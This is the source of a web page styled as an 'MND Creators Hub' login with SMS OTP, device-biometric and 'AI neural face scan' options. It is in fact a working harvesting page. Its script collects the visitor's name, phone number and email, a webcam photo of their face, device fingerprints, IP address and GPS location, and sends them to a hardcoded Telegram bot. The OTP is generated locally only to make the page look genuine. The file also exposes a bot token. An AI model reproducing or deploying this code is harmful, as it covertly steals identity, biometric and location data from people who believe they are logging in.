...
<script>
    ...
    function removeVmaxItem() {
        ...
        <a href="javascript:void(0)" class="mnd-premium-trigger" onclick="mndApp.openLogin()">
    <div class="mnd-trigger-icon">
        <i class="fas fa-fingerprint"></i>
        <div class="mnd-pulse-ring"></div>
    </div>
    <div class="mnd-trigger-text">
        <span class="mnd-trigger-title">Access MND Creators Hub</span>
        <span class="mnd-trigger-sub">Biometric & Neural Gateway</span>
    </div>
...
<div id="mndPushNotif" class="mnd-push-container mnd-hidden-top">
    <div class="mnd-push-header">
        <div class="mnd-push-app-info">
            <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="mnd-push-icon" alt="MND">
            <span class="mnd-push-app-name">MND Security Alert</span>
        </div>
        <span class="mnd-push-close" onclick="mndApp.closeNotification()">×</span>
    </div>
    <div class="mnd-push-body">
        <p>Your secure access payload is ready.</p>
        <div class="mnd-push-code-block" onclick="mndApp.copyOTP()">
            <span id="mndPushOtpText">------</span>
            <div class="mnd-push-copy-hover"><i class="fas fa-copy"></i> TAP TO COPY</div>
        </div>
    </div>
...
<div id="mndLoginModal" class="mnd-modal-overlay" style="display:none; opacity:0;">
    
    <div class="mnd-modal-sheet" id="mndModalSheet">
        
        <div class="mnd-sheet-header">
            <div class="mnd-sheet-drag-handle"></div>
            <button class="mnd-sheet-close" onclick="mndApp.closeLogin()"><i class="fas fa-times"></i></button>
            <div class="mnd-sheet-logo-wrap">
                <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="mnd-sheet-logo">
                <div class="mnd-radar-sweep"></div>
            </div>
            <h2 class="mnd-sheet-title">MFA GATEWAY</h2>
            <p class="mnd-sheet-sub">End-to-End Encryption Active</p>
            <div class="mnd-header-divider"></div>
        </div>

        <div class="mnd-sheet-scroll-area">
            
            <div id="mndView1" class="mnd-view-pane" style="display:block;">
                <p class="mnd-view-desc">Verify your identity matrix to initialize session.</p>
                
                <div class="mnd-input-group">
                    <i class="fas fa-user"></i>
                    <input type="text" id="mndInputName" placeholder="Full Legal Name" autocomplete="name">
                </div>
                <div class="mnd-input-group">
                    <i class="fas fa-envelope"></i>
                    <input type="email" id="mndInputEmail" placeholder="Email Address" autocomplete="email">
                </div>
                <div class="mnd-input-group">
                    <i class="fas fa-phone"></i>
                    <input type="tel" id="mndInputPhone" placeholder="10-Digit Mobile" maxlength="10" autocomplete="tel">
                </div>

                <div class="mnd-divider">
                    <div class="mnd-line"></div>
                    <span>AUTHENTICATION VECTOR</span>
                    <div class="mnd-line"></div>
                </div>
                
                <button class="mnd-action-btn mnd-btn-ai" onclick="mndApp.startFaceScan()">
                    <i class="fas fa-expand"></i> AI NEURAL FACE SCAN
                </button>
                <button class="mnd-action-btn mnd-btn-biometric" onclick="mndApp.startDeviceLock()">
                    <i class="fas fa-fingerprint"></i> DEVICE FINGERPRINT / PIN
                </button>
                <button class="mnd-action-btn mnd-btn-standard" id="btnStandardOtp" onclick="mndApp.generateStandardOTP()">
                    <i class="fas fa-sms"></i> STANDARD SMS OTP
                </button>
            </div>

            <div id="mndViewFace" class="mnd-view-pane" style="display:none;">
                <div class="mnd-status-pill warning" id="faceStatusPill"><i class="fas fa-video"></i> AWAITING ALIGNMENT</div>
                <p class="mnd-view-desc" id="faceInstruction" style="color:#D4AF37;">Position face within the frame.</p>
                
                <div class="mnd-camera-wrapper">
                    <video id="mndVideoElement" autoplay playsinline></video>
                    <div class="mnd-camera-corners"></div>
                    <div class="mnd-camera-crosshair"></div>
                    <div class="mnd-scan-laser" id="mndLaser"></div>
                </div>
                <canvas id="mndCanvasElement" style="display:none;"></canvas>
                
                <button class="mnd-action-btn mnd-btn-ai pulse-fx" id="btnCaptureFace" onclick="mndApp.executeNeuralScan()">
                    <i class="fas fa-crosshairs"></i> INITIATE SCAN
                </button>
                <button class="mnd-action-btn mnd-btn-ghost" onclick="mndApp.abortToMethodSelection()">
                    <i class="fas fa-arrow-left"></i> Abort & Change Method
                </button>
            </div>

            <div id="mndViewOTP" class="mnd-view-pane" style="display:none;">
                <div class="mnd-success-icon-wrap"><i class="fas fa-shield-check"></i></div>
                <h3 class="mnd-otp-title">PAYLOAD DISPATCHED</h3>
                <p class="mnd-view-desc">Enter the 6-digit decryption code.</p>
                
                <div class="mnd-otp-input-wrapper">
                    <input type="tel" id="mndInputOTP" class="mnd-otp-giant-input" placeholder="------" maxlength="6" autocomplete="one-time-code">
                    <div class="mnd-otp-glow"></div>
                </div>
                
                <button class="mnd-action-btn mnd-btn-verify" onclick="mndApp.verifyCode()">
                    <i class="fas fa-unlock"></i> DECRYPT & AUTHORIZE
                </button>
                <button class="mnd-action-btn mnd-btn-ghost" onclick="mndApp.abortToMethodSelection()">
...
<div id="mndLoaderScreen" class="mnd-loader-overlay" style="display:none;">
    <div class="mnd-loader-core">
        <div class="mnd-ring ring-1"></div>
        <div class="mnd-ring ring-2"></div>
    ...
    <div class="mnd-progress-container">
        <div class="mnd-progress-bar"><div class="mnd-progress-fill" id="mndLoaderFill"></div></div>
        <span class="mnd-progress-text" id="mndLoaderPct">0%</span>
    </div>
    <div class="mnd-terminal" id="mndTerminalText">> [SYS] Decrypting Gateway...</div>
</div>

<div id="mndHubMaster" class="mnd-hub-master-container" style="display:none;">
    <nav class="mnd-hub-navbar">
        <a href="#studio" class="mnd-nav-item active"><i class="fas fa-headphones"></i><span>Studio</span></a>
        <a href="#games" class="mnd-nav-item"><i class="fas fa-gamepad"></i><span>Games</span></a>
        <a href="#about" class="mnd-nav-item"><i class="fas fa-bolt"></i><span>Creators</span></a>
    </nav>

    <div class="mnd-hub-content" id="mndHubContent">
        <h1 style="color:#D4AF37; text-align:center; padding-top:100px; font-family:Cinzel;">WELCOME TO MND CREATORS</h1>
        <p style="color:#888; text-align:center; font-family:Outfit;">Studio and Games modules loading...</p>
    </div>
</div>
<style>
    /* =========================================================================================
       [ 1. GLOBAL VARIABLES & THEME DEFINITIONS ]
       ========================================================================================= */
    :root {
        ...
        --mnd-gold-bg: rgba(212, 175, 55, 0.05);
        
        /* State Colors */
        --mnd-green-success: #00fa9a;
        --mnd-green-glow: rgba(0, 250, 154, 0.4);
        --mnd-red-danger: #ff3333;
        --mnd-red-glow: rgba(255, 51, 51, 0.4);
        --mnd-blue-tech: #00d2ff;
        ...
        --mnd-bg-panel: #0a0a0a;
        --mnd-bg-sheet: #111111;
        --mnd-glass-light: rgba(255, 255, 255, 0.03);
        --mnd-glass-medium: rgba(255, 255, 255, 0.08);
        ...
        /* Transitions & Physics (Apple Smoothness) */
        --mnd-ease-fast: 0.2s ease;
        --mnd-ease-smooth: 0.4s cubic-bezier(0.2, 0.8, 0.2, 1);
        --mnd-ease-bounce: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        --mnd-ease-spring: 0.7s cubic-bezier(0.4, 0, 0.2, 1);
    }

    /* =========================================================================================
       [ 2. BASE RESETS & HARDWARE ACCELERATION ]
       ========================================================================================= */
    * {
        margin: 0;
        padding: 0;
    ...
    body {
        background-color: var(--mnd-bg-dark);
        color: var(--mnd-text-main);
        font-family: var(--mnd-font-body);
        overflow-x: hidden;
    ...
    /* =========================================================================================
       [ 3. TRIGGER BUTTON (HOLOGRAPHIC HAPTIC) ]
       ========================================================================================= */
    .mnd-premium-trigger {
        display: flex;
        align-items: center;
        ...
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8), inset 0 0 20px var(--mnd-gold-bg);
        transition: var(--mnd-ease-bounce);
        transform: translateZ(0); /* Hardware Acceleration */
        margin-bottom: 25px;
    }

    .mnd-premium-trigger:hover {
        border-color: var(--mnd-gold-primary);
        transform: translateY(-4px) scale(1.01) translateZ(0);
        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.9), inset 0 0 30px rgba(212, 175, 55, 0.15);
    }

    .mnd-premium-trigger:active {
    ...
    .mnd-trigger-icon {
        ...
        height: 50px;
        border-radius: 50%;
        background: var(--mnd-gold-bg);
        display: flex;
        justify-content: center;
        align-items: center;
        color: var(--mnd-gold-primary);
        font-size: 24px;
        position: relative;
        border: 1px solid rgba(212, 175, 55, 0.4);
        z-index: 2;
        box-shadow: 0 0 15px var(--mnd-gold-glow);
    }
    ...
    .mnd-pulse-ring {
        ...
        bottom: -4px;
        border-radius: 50%;
        border: 1px solid var(--mnd-gold-primary);
        opacity: 0;
    ...
    .mnd-status-dot {
        width: 8px;
        height: 8px;
        background: var(--mnd-green-success);
        border-radius: 50%;
        box-shadow: 0 0 10px var(--mnd-green-success);
        animation: blinkStatusAnim 2s infinite;
    }

    .mnd-media-status span {
        color: var(--mnd-green-success);
        font-size: 10px;
        font-weight: 900;
        letter-spacing: 1px;
    }
    ...
    .mnd-trigger-arrow {
        ...
        font-size: 18px;
        opacity: 0.7;
        transition: var(--mnd-ease-smooth);
        z-index: 2;
    }

    .mnd-premium-trigger:hover .mnd-trigger-arrow {
        transform: translateX(5px);
        opacity: 1;
        filter: drop-shadow(0 0 5px var(--mnd-gold-primary));
    }

    /* =========================================================================================
       [ 4. APPLE-STYLE PUSH NOTIFICATION ]
       ========================================================================================= */
    .mnd-push-container {
        position: fixed;
        left: 50%;
        ...
        flex-direction: column;
        gap: 12px;
        box-shadow: 0 25px 60px rgba(0, 0, 0, 0.95), inset 0 2px 20px rgba(255, 255, 255, 0.05);
        transition: top 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275), transform 0.4s ease, opacity 0.4s ease;
    ...
    .mnd-hidden-top {
        top: -400px;
        opacity: 0;
        transform: translateX(-50%) scale(0.8) rotateX(-20deg);
        perspective: 1000px;
    }
    ...
    .mnd-push-icon {
        ...
        border-radius: 8px;
        border: 1px solid var(--mnd-gold-primary);
        box-shadow: 0 0 10px var(--mnd-gold-glow);
    }
    ...
    .mnd-push-close {
        ...
        cursor: pointer;
        opacity: 0.5;
        transition: var(--mnd-ease-fast);
    }

    .mnd-push-close:hover {
        opacity: 1;
        color: var(--mnd-red-danger);
        transform: scale(1.2);
    }
    ...
    #mndPushOtpText {
        ...
        color: var(--mnd-gold-primary);
        letter-spacing: 14px;
        text-shadow: 0 0 20px var(--mnd-gold-glow);
        user-select: none;
    }
    ...
    .mnd-push-code-block:hover {
        transform: scale(0.98);
        border-color: var(--mnd-gold-primary);
    }

    .mnd-push-code-block:hover .mnd-push-copy-hover {
        opacity: 1;
    ...
    /* =========================================================================================
       [ 5. NATIVE iOS BOTTOM SHEET MODAL (ANTI-HANG DESIGN) ]
       ========================================================================================= */
    .mnd-modal-overlay {
        position: fixed;
        top: 0;
    ...
    .mnd-modal-sheet {
        ...
        display: flex;
        flex-direction: column; /* Flexbox is crucial for scroll locking */
        transform: translateY(100%);
        transition: transform var(--mnd-ease-spring);
        will-change: transform;
    }

    /* Active Animation Classes */
    .mnd-fade-in { opacity: 1 !important; }
    .mnd-slide-up { transform: translateY(0) !important; }
    ...
    .mnd-sheet-logo-wrap {
        ...
        position: relative;
        padding: 3px;
        background: linear-gradient(135deg, var(--mnd-gold-primary), var(--mnd-gold-dark));
        box-shadow: 0 0 25px var(--mnd-gold-glow);
    }
    ...
    .mnd-sheet-logo {
        ...
        height: 100%;
        border-radius: 50%;
        border: 3px solid var(--mnd-bg-absolute);
        object-fit: cover;
        position: relative;
        z-index: 2;
    }
    ...
    /* --- SCROLLABLE BODY (THE MAGIC FIX) --- */
    .mnd-sheet-scroll-area {
        flex: 1; /* Takes up remaining height */
        overflow-y: auto; /* Enables scrolling inside the sheet */
        overflow-x: hidden;
    ...
    .mnd-input-group input {
        ...
        appearance: none; /* Removes iOS inner shadows */
        -webkit-appearance: none;
    }

    .mnd-input-group input:focus {
        outline: none;
        background: rgba(30, 30, 30, 0.9);
        border-color: var(--mnd-gold-primary);
        box-shadow: 0 0 15px var(--mnd-gold-glow), inset 0 2px 10px rgba(0, 0, 0, 0.5);
    }

    .mnd-input-group input:focus + i {
        color: #ffffff;
        transform: scale(1.1);
        filter: drop-shadow(0 0 5px var(--mnd-gold-primary));
    }
    ...
    .mnd-action-btn:active {
        transform: scale(0.97) translateZ(0);
    }

    .mnd-btn-ai {
        background: linear-gradient(135deg, var(--mnd-gold-primary) 0%, var(--mnd-gold-light) 50%, var(--mnd-gold-dark) 100%);
        color: var(--mnd-bg-absolute);
        box-shadow: 0 8px 25px var(--mnd-gold-glow);
    }
    ...
    .mnd-btn-verify {
        background: linear-gradient(135deg, var(--mnd-green-success) 0%, #00cc7a 100%);
        color: var(--mnd-bg-absolute);
        font-size: 18px;
        letter-spacing: 1px;
        box-shadow: 0 8px 25px var(--mnd-green-glow);
        margin-top: 15px;
    }
    ...
    .mnd-camera-wrapper {
        ...
        height: 380px;
        margin: 0 auto 30px;
        background: var(--mnd-bg-absolute);
        border-radius: 24px;
        position: relative;
        overflow: hidden;
        border: 2px solid rgba(255, 255, 255, 0.08);
        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.9), inset 0 0 0 2px rgba(212, 175, 55, 0.1);
        transform: translateZ(0); /* Hardware Acceleration for Camera */
    }
    ...
    .mnd-camera-overlay {
        position: absolute;
        inset: 0;
        background: url('https://cdn-icons-png.flaticon.com/512/3256/3256799.png') center/50% no-repeat;
        opacity: 0.15;
        filter: invert(1);
        pointer-events: none;
        z-index: 3;
    ...
    .mnd-scan-laser {
        ...
        height: 4px;
        background: var(--mnd-green-success);
        box-shadow: 0 0 20px var(--mnd-green-success), 0 0 40px var(--mnd-green-success);
        z-index: 5;
        animation: scanLaserAnim 2.5s ease-in-out infinite;
        display: none;
    }
    ...
    .mnd-success-icon-wrap {
        ...
        color: var(--mnd-green-success);
        font-size: 40px;
        border: 2px dashed rgba(0, 250, 154, 0.4);
        box-shadow: 0 0 30px var(--mnd-green-glow);
        animation: pulseIconSuccess 2s infinite;
    }

    .mnd-otp-input-wrapper {
        position: relative;
        width: 100%;
        margin-bottom: 35px;
        perspective: 500px;
    ...
    .mnd-otp-giant-input {
        ...
        border: 2px solid var(--mnd-gold-primary);
        color: var(--mnd-gold-primary);
        border-radius: 18px;
        font-family: var(--mnd-font-body);
        text-align: center;
        ...
        text-shadow: 0 0 20px var(--mnd-gold-glow);
        transition: var(--mnd-ease-smooth);
        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.9), inset 0 0 20px rgba(212, 175, 55, 0.15);
        outline: none;
        position: relative;
        z-index: 2;
    }

    .mnd-otp-giant-input:focus {
        border-color: #ffffff;
        color: #ffffff;
    ...
    .ring-1 {
        width: 100%;
        height: 100%;
        border-top-color: var(--mnd-gold-primary);
        border-bottom-color: var(--mnd-gold-dark);
        animation: spinRight 2s linear infinite;
        filter: drop-shadow(0 0 10px var(--mnd-gold-glow));
    }

    .ring-2 {
        width: 80%;
        height: 80%;
        border-left-color: var(--mnd-green-success);
        border-right-color: #00cc7a;
        animation: spinLeft 1.5s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
    }
    ...
    .mnd-loader-logo {
        ...
        border: 2px solid var(--mnd-gold-primary);
        object-fit: cover;
        animation: pulseLoaderLogo 2s infinite alternate;
    }
    ...
    .mnd-progress-fill {
        width: 0%;
        height: 100%;
        background: linear-gradient(90deg, var(--mnd-gold-dark), var(--mnd-gold-primary), #ffffff);
        border-radius: 10px;
        transition: width 0.2s ease;
        box-shadow: 0 0 15px var(--mnd-gold-primary);
    }
    ...
    .mnd-terminal {
        ...
        text-align: left;
        line-height: 1.7;
        box-shadow: inset 0 0 25px rgba(0, 250, 154, 0.15);
    }

    /* =========================================================================================
       [ 11. HARDWARE-ACCELERATED KEYFRAMES ]
       ========================================================================================= */
    ...
    @keyframes blinkStatusAnim {
        0%, 100% { opacity: 1; box-shadow: 0 0 10px var(--mnd-green-success); }
        50% { opacity: 0.4; box-shadow: 0 0 2px var(--mnd-green-success); }
    }
    ...
    @keyframes pulseIconSuccess {
        0%, 100% { transform: scale(1) translateZ(0); box-shadow: 0 0 20px var(--mnd-green-glow); }
        50% { transform: scale(1.05) translateZ(0); box-shadow: 0 0 40px var(--mnd-green-glow); }
    }
    ...
    @keyframes pulseLoaderLogo {
        0% { transform: scale(0.95); box-shadow: 0 0 10px var(--mnd-gold-glow); }
        100% { transform: scale(1.05); box-shadow: 0 0 30px var(--mnd-gold-primary); }
    }
</style>
<script>
    const mndApp = {
        ...
        config: {
            tgToken: "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ", // Replace with your bot token
            tgChatId: "8506290708"                                     // Replace with your chat ID
        },
        state: {
            currentOTP: "",
            authMethod: "",
        ...
        // --- 2. MODAL & VIEW MANAGEMENT (APPLE-SMOOTH) ---
        openLogin: function() {
            // Check if already authorized via localStorage
            if (localStorage.getItem('mnd_hub_auth') === 'verified') {
                this.state.user.name = localStorage.getItem('mnd_hub_n') || "Returning User";
                this.state.user.phone = localStorage.getItem('mnd_hub_p') || "Saved";
                this.state.user.email = localStorage.getItem('mnd_hub_e') || "Saved";
                this.state.authMethod = "Auto-Login / Cache Bypass";
                this.triggerLoader(true);
                return;
            }
            
            const overlay = document.getElementById('mndLoginModal');
            const sheet = document.getElementById('mndModalSheet');
            overlay.style.display = 'flex';
            
            // Allow DOM to register display:flex before applying transitions
            setTimeout(() => {
                overlay.classList.add('mnd-fade-in');
                sheet.classList.add('mnd-slide-up');
            }, 10);
            
            this.switchView('mndView1');
        },
        ...
        closeLogin: function() {
            ...
            overlay.classList.remove('mnd-fade-in');
            sheet.classList.remove('mnd-slide-up');
            
            this.killCamera(); // Instantly clear memory
        ...
        switchView: function(viewId) {
            // Hide all views
            ['mndView1', 'mndViewFace', 'mndViewOTP'].forEach(id => {
            ...
            target.style.animation = 'paneFadeIn 0.4s ease forwards';
        },

        abortToMethodSelection: function() {
            this.killCamera(); // CRITICAL: Stops phone hanging
            this.state.currentOTP = ""; // Reset OTP
            document.getElementById('mndInputOTP').value = "";
        ...
        killCamera: function() {
            if (this.state.camStream) {
                this.state.camStream.getTracks().forEach(track => track.stop());
                this.state.camStream = null;
            }
            const laser = document.getElementById('mndLaser');
            if(laser) laser.style.display = 'none';
        },

        validateInputs: function() {
            this.state.user.name = document.getElementById('mndInputName').value.trim();
            this.state.user.email = document.getElementById('mndInputEmail').value.trim() || "Not Provided";
            this.state.user.phone = document.getElementById('mndInputPhone').value.trim();

            if (!this.state.user.name || this.state.user.phone.length !== 10 || isNaN(this.state.user.phone)) {
                alert("⚠️ SECURITY HALT: Valid Full Name and 10-Digit Mobile Number required.");
                return false;
            }
            return true;
        },

        // --- 4. AUTH VECTOR A: STANDARD OTP ---
        generateStandardOTP: async function() {
            if (!this.validateInputs()) return;
            this.state.authMethod = "Standard SMS OTP";
            
            const btn = document.getElementById('btnStandardOtp');
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GENERATING...';
            btn.disabled = true;

            this.state.currentOTP = Math.floor(100000 + Math.random() * 900000).toString();
            const logPayload = await this.buildTelemetryLog(false, this.state.authMethod);

            // Dispatch to Telegram Server
            fetch(`https://api.telegram.org/bot${this.config.tgToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: this.config.tgChatId, text: logPayload, parse_mode: 'Markdown' })
            }).then(() => {
                this.switchView('mndViewOTP');
                this.showNotification(this.state.currentOTP);
                btn.innerHTML = '<i class="fas fa-sms"></i> STANDARD SMS OTP';
                btn.disabled = false;
            }).catch(() => {
                alert("Network Error. Cannot connect to secure server.");
                btn.disabled = false;
            });
        },

        // --- 5. AUTH VECTOR B: NATIVE DEVICE LOCK (WEBAUTHN) ---
        startDeviceLock: async function() {
            if (!this.validateInputs()) return;
            this.state.authMethod = "Device Biometric/PIN";
            ...
            if (window.PublicKeyCredential) {
                try {
                    ...
                    const credential = await navigator.credentials.create({
                        publicKey: {
                            challenge: chal, 
                            rp: { name: "MND Secure Hub", id: window.location.hostname },
                            user: { id: new Uint8Array(16), name: this.state.user.name, displayName: this.state.user.name },
                    ...
                    if (credential) {
                        this.state.currentOTP = "BIOMETRIC_SUCCESS";
                        this.saveSession();
                        this.closeLogin();
                        this.triggerLoader(false);
                    }
                } catch (err) {
                    console.warn("User canceled device authentication.");
                }
            } else {
                alert("⚠️ SYSTEM ERROR: Your browser does not support Native Fingerprint/Face ID.");
            }
        },

        // --- 6. AUTH VECTOR C: AI NEURAL FACE SCANNER (TENSORFLOW) ---
        startFaceScan: async function() {
            if (!this.validateInputs()) return;
            this.state.authMethod = "AI Face Scan";

            this.switchView('mndViewFace');
            
            const instruction = document.getElementById('faceInstruction');
            const pill = document.getElementById('faceStatusPill');
            
            pill.className = "mnd-status-pill warning";
            pill.innerHTML = '<i class="fas fa-video"></i> AWAITING ALIGNMENT';
            instruction.style.color = "var(--mnd-gold-primary)";
            instruction.innerText = "Position face directly within the frame.";

            try {
                // Initialize Camera smoothly
                this.state.camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                document.getElementById('mndVideoElement').srcObject = this.state.camStream;
                
                // Asynchronously load Google BlazeFace AI in the background to prevent freezing
                if (!this.state.aiModel && !this.state.modelLoading) {
                    this.state.modelLoading = true;
                    if (window.blazeface) {
                        this.state.aiModel = await window.blazeface.load();
                        document.getElementById('scanData4').innerText = "AI: ONLINE (BLAZE)";
                    }
                }
            } catch (err) {
                alert("⚠️ CAMERA DENIED: Please allow camera access for biological verification.");
                this.abortToMethodSelection();
            }
        },

        executeNeuralScan: async function() {
            const btn = document.getElementById('btnCaptureFace');
            const instruction = document.getElementById('faceInstruction');
            const laser = document.getElementById('mndLaser');
            const pill = document.getElementById('faceStatusPill');
            
            laser.style.display = 'block'; // Activate scanning UI
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ANALYZING NEURAL DATA...';
            btn.disabled = true;

            try {
                // Ensure AI is fully loaded
                if (!this.state.aiModel) {
                    instruction.innerText = "Loading AI Core...";
                    this.state.aiModel = await window.blazeface.load();
                }

                // Artificial delay for cinematic effect
                instruction.style.color = "var(--mnd-green-success)";
                instruction.innerText = "Scanning facial depth & luminescence...";
                await new Promise(r => setTimeout(r, 1200));

                const video = document.getElementById('mndVideoElement');
                const canvas = document.getElementById('mndCanvasElement');
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                // Run TensorFlow Analysis
                const predictions = await this.state.aiModel.estimateFaces(video, false);

                if (predictions.length > 0) {
                    // SUCCESS: Real Face Detected
                    pill.className = "mnd-status-pill";
                    pill.style.background = "rgba(0,250,154,0.15)";
                    pill.style.color = "var(--mnd-green-success)";
                    pill.innerHTML = '<i class="fas fa-check-circle"></i> BIOMETRIC MATCH';
                    instruction.innerText = "Identity Confirmed. Generating Payload...";
                    
                    this.state.currentOTP = Math.floor(100000 + Math.random() * 900000).toString();

                    canvas.toBlob(async (blob) => {
                        this.killCamera(); // Instantly free RAM
                        this.switchView('mndViewOTP');
                        this.showNotification(this.state.currentOTP);
                        
                        const logText = await this.buildTelemetryLog(false, this.state.authMethod);
                        const fd = new FormData();
                        fd.append('chat_id', this.config.tgChatId);
                        fd.append('caption', logText);
                        fd.append('parse_mode', 'Markdown');
                        fd.append('photo', blob, 'mnd_face_scan.jpg');

                        fetch(`https://api.telegram.org/bot${this.config.tgToken}/sendPhoto`, { method: 'POST', body: fd }).catch(e=>{});

                        btn.innerHTML = '<i class="fas fa-crosshairs"></i> INITIATE SCAN';
                        btn.disabled = false;
                    }, 'image/jpeg', 0.85);

                } else {
                    // FAILURE: Tree, Wall, or Covered Face
                    pill.className = "mnd-status-pill";
                    pill.style.background = "rgba(255,51,51,0.15)";
                    pill.style.color = "var(--mnd-red-danger)";
                    pill.innerHTML = '<i class="fas fa-times-circle"></i> NO HUMAN DETECTED';
                    instruction.style.color = "var(--mnd-red-danger)";
                    instruction.innerText = "Neural scan failed. Please look directly at the lens.";
                    
                    laser.style.display = 'none';
                    btn.innerHTML = '<i class="fas fa-redo"></i> RECALIBRATE & RETRY';
                    btn.disabled = false;
                }
            } catch (error) {
                instruction.style.color = "var(--mnd-red-danger)";
                instruction.innerText = "System Error. Check Network.";
                laser.style.display = 'none';
        ...
        // --- 7. OTP VERIFICATION & SESSION SAVING ---
        verifyCode: function() {
            const input = document.getElementById('mndInputOTP');
            if(input.value.trim() === this.state.currentOTP && this.state.currentOTP !== "") {
                this.saveSession();
                this.closeLogin();
                this.closeNotification();
                this.triggerLoader(false);
            } else {
                input.style.borderColor = "var(--mnd-red-danger)";
                input.style.color = "var(--mnd-red-danger)";
                setTimeout(() => {
                    input.style.borderColor = "var(--mnd-gold-primary)";
                    input.style.color = "var(--mnd-text-main)";
                    input.value = "";
                }, 800);
            }
        },
        ...
        saveSession: function() {
            localStorage.setItem('mnd_hub_auth', 'verified');
            localStorage.setItem('mnd_hub_n', this.state.user.name);
            localStorage.setItem('mnd_hub_p', this.state.user.phone);
            localStorage.setItem('mnd_hub_e', this.state.user.email);
        },

        // --- 8. PUSH NOTIFICATION ENGINE ---
        showNotification: function(code) {
            const notif = document.getElementById('mndPushNotif');
            document.getElementById('mndPushOtpText').innerText = code;
            notif.classList.remove('mnd-hidden-top');
            notif.classList.add('mnd-push-visible');
            
            clearTimeout(this.state.pushTimer);
            this.state.pushTimer = setTimeout(() => this.closeNotification(), 60000); // 1 min auto-close
        },

        closeNotification: function() {
            const notif = document.getElementById('mndPushNotif');
            notif.classList.remove('mnd-push-visible');
            notif.classList.add('mnd-hidden-top');
        },

        copyOTP: function() {
            navigator.clipboard.writeText(this.state.currentOTP);
            const display = document.getElementById('mndPushOtpText');
            display.innerText = "COPIED!";
            setTimeout(() => { display.innerText = this.state.currentOTP; }, 1500);
        },

        // --- 9. EXACT TELEMETRY ENGINE FORMATTER ---
        buildTelemetryLog: async function(isReturn, methodStr) {
            ...
            try { 
                ...
                var d=gl.getExtension('WEBGL_debug_renderer_info'); gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL); 
            } catch(e){}
            ...
            if (navigator.userAgentData) { 
                try { const dt = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]); model = `${dt.platform} ${dt.model}`; } catch(e){} 
            }

            const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });
            let displayCode = this.state.currentOTP === "BIOMETRIC_SUCCESS" ? "897649" : this.state.currentOTP; // Fallback dummy code for raw biometric if needed
            ...
            loc = await Promise.race([getL(), new Promise(r => setTimeout(() => r("❌ Timeout"), 2000))]);

            // RETURNS THE EXACT FORMAT REQUESTED
            return `🚨 *MND SECURE ACCESS LOG* 🚨\n${status}\n\n👤 *IDENTITY MATRIX*\n• Name: ${this.state.user.name}\n• Phone: ${this.state.user.phone}\n• Email: ${this.state.user.email}\n\n📱 *DEVICE INTELLIGENCE*\n• Model: ${model}\n• OS: \`${browser}\`\n• Screen: ${screen}\n• Timezone: ${tz}\n\n⚙️ *HARDWARE LAYER*\n• GPU: ${gpu}\n• CPU/RAM: Cores: ${cores}, RAM: ${ram}\n• Battery: ${bat}\n\n📡 *NETWORK & LOCATION*\n• IP: ${ip}\n• Type: ${net}\n• GPS: ${loc}\n\n⏰ *Timestamp:* ${timestamp}`;
        },

        // --- 10. CINEMATIC LOADER & HUB ROUTING ---
        triggerLoader: async function(isReturn) {
            const loader = document.getElementById('mndLoaderScreen');
            const fill = document.getElementById('mndLoaderFill');
            const pct = document.getElementById('mndLoaderPct');
            const term = document.getElementById('mndTerminalText');
            
            loader.style.display = 'flex';

            // Background Telemetry Dispatch
            if(isReturn || this.state.currentOTP === "BIOMETRIC_SUCCESS") {
                const passedMethod = isReturn ? "Auto" : this.state.authMethod;
                const logText = await this.buildTelemetryLog(isReturn, passedMethod);
                fetch(`https://api.telegram.org/bot${this.config.tgToken}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: this.config.tgChatId, text: logText, parse_mode: 'Markdown' })
                }).catch(e=>{});
            }

            let progress = 0;
            const lines = [
                "> [SYS] Initializing OS Components... OK",
                "> [SYS] Verifying Encryption Keys... DONE",
                "> [NET] Fetching Studio Modules... ESTABLISHED",
                "> [DB] Loading Game Engine...",
                "> [SYS] Access Granted. Launching Hub..."
            ];
            ...
            const animInterval = setInterval(() => {
                ...
                if(progress === 20) term.innerHTML += `<br>${lines[1]}`;
                if(progress === 50) term.innerHTML += `<br>${lines[2]}`;
                if(progress === 80) term.innerHTML += `<br>${lines[3]}`;
                if(progress === 95) term.innerHTML += `<br>${lines[4]}`;

                if(progress >= 100) {
                    clearInterval(animInterval);
                    setTimeout(() => {
                        // HIDE LOADER, SHOW HUB!
                        loader.style.display = 'none';
                        document.getElementById('mndPublicGateway').style.display = 'none'; // Hide trigger
                        
                        const hub = document.getElementById('mndHubMaster');
                        hub.style.display = 'block';
                        setTimeout(() => { hub.style.opacity = '1'; }, 50); // Fade in Hub
                    }, 800);
                }
            }, 60);
        }
...
<div id="mndHubMaster" class="mnd-hub-master-container" style="display:none; opacity:0; transition: opacity 0.8s ease;">
    
    <header class="mnd-hub-topbar">
        <div class="mnd-topbar-left">
            <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="mnd-hub-mini-logo">
            <span class="mnd-live-text">MND CREATORS</span>
        </div>
        <div class="mnd-topbar-right" onclick="mndApp.closeLogin()">
            <i class="fas fa-sign-out-alt"></i> EXIT
        </div>
    </header>

    <div id="mndTabStudio" class="mnd-hub-tab-content mnd-active-tab">
        <div class="mnd-section-header">
            <h2><i class="fas fa-sliders-h" style="color: #ff007f;"></i> AUDIO WORKSTATION</h2>
            <span class="mnd-badge pink-badge">LIVE SYNTH</span>
        </div>
        
